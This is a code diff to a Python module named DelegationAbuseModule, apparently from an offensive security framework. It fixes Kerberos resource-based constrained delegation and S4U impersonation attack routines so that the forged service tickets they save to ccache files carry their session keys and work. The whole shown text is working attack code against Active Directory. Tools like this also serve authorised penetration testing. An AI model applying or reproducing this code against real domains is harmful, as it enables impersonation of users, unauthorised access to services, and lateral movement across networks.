@@ -442,7 +442,7 @@ class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
                 f"{target_service}/{target_computer}",
                 type=constants.PrincipalNameType.NT_SRV_INST.value,
             )
-            final_tgs, _, _, _ = getKerberosTGS(
+            final_tgs, cipher, old_key, new_key = getKerberosTGS(
                 serverName=spn_target,
                 domain=domain_upper,
                 kdcHost=dc,
@@ -457,13 +457,15 @@ class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
             os.close(_fd)
 
             cc = CCache()
+            if hasattr(cc, "fromTGS"):
+                cc.fromTGS(final_tgs, old_key, new_key)
             cc.saveFile(ccache_path)
             logger.info("rbcd_ticket_saved", path=ccache_path,
                         warning="Credential artifact on disk - delete after use")
             return ccache_path
 
         except Exception as exc:
-            raise self._classify_error(exc, target=target) from exc
+            raise self._classify_error(exc, target=target_computer) from exc
 
     def _s4u_attack_sync(self, dc: str, domain: str, username: str, password: str,
                           constrained_acct: dict, impersonate_user: str) -> str:
@@ -490,7 +492,7 @@ class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
 
             spn = Principal(targets[0],
                             type=constants.PrincipalNameType.NT_SRV_INST.value)
-            tgs, _, _, _ = getKerberosTGS(
+            tgs, cipher, old_key, new_key = getKerberosTGS(
                 serverName=spn, domain=domain_upper,
                 kdcHost=dc, tgt=tgt, cipher=cipher, sessionKey=session_key,
             )
@@ -498,6 +500,8 @@ class DelegationAbuseModule(BaseModule[DelegationAbuseParams, ModuleResult]):
             ccache_path, _fd = secure_mkstemp(suffix=".ccache", prefix="ares_s4u_")
             os.close(_fd)
             cc = CCache()
+            if hasattr(cc, "fromTGS"):
+                cc.fromTGS(tgs, old_key, new_key)
             cc.saveFile(ccache_path)
             return ccache_path
         except Exception as exc:
